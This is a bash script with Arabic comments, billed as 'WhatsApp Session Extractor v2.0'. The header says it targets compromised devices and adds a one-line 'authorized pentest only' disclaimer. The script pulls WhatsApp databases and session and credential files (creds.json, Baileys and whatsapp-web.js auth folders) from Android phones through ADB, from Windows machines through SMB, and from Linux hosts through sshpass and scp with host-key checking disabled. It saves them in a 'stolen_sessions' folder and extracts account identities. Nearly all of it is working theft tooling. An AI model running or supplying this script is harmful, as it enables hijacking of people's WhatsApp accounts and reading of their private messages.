#!/bin/bash

# ============================================
# استخراج جلسات واتساب من الأجهزة المخترقة
# للاستخدام المصرح به فقط
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}   WhatsApp Session Extractor v2.0${NC}"
echo -e "${BLUE}   اختبار اختراق مصرح به فقط${NC}"
echo -e "${BLUE}========================================${NC}"

SESSION_DIR="./stolen_sessions"
mkdir -p "$SESSION_DIR"

# ========== الأندرويد (عبر ADB) ==========
extract_android() {
    echo -e "${YELLOW}[*] فحص أجهزة أندرويد...${NC}"
    
    if command -v adb &> /dev/null; then
        adb devices | grep -w "device" | while read -r line; do
            device=$(echo "$line" | awk '{print $1}')
            echo -e "${GREEN}[+] جهاز أندرويد موجود: $device${NC}"
            
            # مسارات جلسة واتساب على أندرويد
            local paths=(
                "/data/data/com.whatsapp/databases/wa.db"
                "/data/data/com.whatsapp/files/backups/"
                "/data/data/com.whatsapp/shared_prefs/"
                "/storage/emulated/0/Android/media/com.whatsapp/"
            )
            
            for path in "${paths[@]}"; do
                echo -e "${YELLOW}[*] محاولة سحب: $path${NC}"
                adb -s "$device" pull "$path" "$SESSION_DIR/android_${device}/" 2>/dev/null
            done
            
            # نسخ مجلد الجلسة (Baileys / whatsapp-web.js)
            echo -e "${YELLOW}[*] البحث عن جلسات بايليز...${NC}"
            adb -s "$device" shell "find /sdcard -name 'creds.json' -o -name 'session.json' -o -name 'auth_info*' 2>/dev/null" | while read -r file; do
                adb -s "$device" pull "$file" "$SESSION_DIR/android_${device}/"
                echo -e "${GREEN}[+] وجدت جلسة: $file${NC}"
            done
        done
    else
        echo -e "${RED}[-] ADB غير مثبت. ثبته: sudo apt install adb${NC}"
    fi
}

# ========== ويندوز (عبر SMB/SSH) ==========
extract_windows() {
    local ip="$1"
    local user="$2"
    local pass="$3"
    
    echo -e "${YELLOW}[*] محاولة الاتصال بجهاز ويندوز: $ip${NC}"
    
    # مسارات جلسة واتساب على ويندوز
    local paths=(
        "C:\\Users\\*\\AppData\\Local\\whatsapp-web.js\\"
        "C:\\Users\\*\\AppData\\Roaming\\whatsapp-web.js\\"
        "C:\\Users\\*\\AppData\\Local\\Baileys\\"
        "C:\\Users\\*\\whatsapp-bot\\session\\"
    )
    
    for path in "${paths[@]}"; do
        echo -e "${YELLOW}[*] فحص: $path${NC}"
        # استخدام smbclient أو ssh لسحب الملفات
        if command -v smbclient &> /dev/null; then
            smbclient "//$ip/C\$" -U "$user%$pass" -c "recurse; prompt; mget \"${path}*session*\"" 2>/dev/null
        fi
    done
}

# ========== لينكس/ماك (SSH) ==========
extract_linux() {
    local ip="$1"
    local user="$2"
    local pass="$3"
    
    echo -e "${YELLOW}[*] محاولة SSH لجهاز: $ip${NC}"
    
    # مسارات جلسة واتساب على لينكس
    local paths=(
        "~/.wwebjs_auth/"
        "~/.config/whatsapp-web.js/"
        "~/whatsapp-bot/session/"
        "~/Baileys/auth_info/"
    )
    
    for path in "${paths[@]}"; do
        echo -e "${YELLOW}[*] فحص: $path${NC}"
        sshpass -p "$pass" scp -o StrictHostKeyChecking=no -r "$user@$ip:$path" "$SESSION_DIR/linux_$ip/" 2>/dev/null
    done
}

# ========== فحص الملفات المستخرجة ==========

analyze_sessions() {
    echo -e "${BLUE}[*] تحليل الجلسات المستخرجة...${NC}"
    
    find "$SESSION_DIR" -type f \( -name "creds.json" -o -name "session.json" -o -name "*.session" \) 2>/dev/null | while read -r session_file; do
        echo -e "${GREEN}[+] جلسة موجودة: $session_file${NC}"
        
        # استخراج معلومات من الجلسة
        if command -v jq &> /dev/null; then
            jq '. | {me: .me?.id, name: .me?.name, platform: .platform}' "$session_file" 2>/dev/null
        fi
        
        # نسخ إلى مجلد sessions النهائي
        cp "$session_file" "./sessions/"
    done
    
    echo -e "${GREEN}[+] تم استخراج $(find ./sessions -type f | wc -l) ملفات جلسة${NC}"
}

# ========== التنفيذ ==========

case "${1:-all}" in
    android)
        extract_android
        ;;
    windows)
        extract_windows "$2" "$3" "$4"
        ;;
    linux)
        extract_linux "$2" "$3" "$4"
        ;;
    all|*)
        extract_android
        # إذا عندك IPs configure في config.json
        if [[ -f "config.json" ]]; then
            echo -e "${YELLOW}[*] فحص config.json لأجهزة إضافية...${NC}"
        fi
        ;;
esac

analyze_sessions

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}   تم الانتهاء من استخراج الجلسات${NC}"
echo -e "${GREEN}   الجلسات في: $SESSION_DIR/${NC}"
echo -e "${GREEN}========================================${NC}"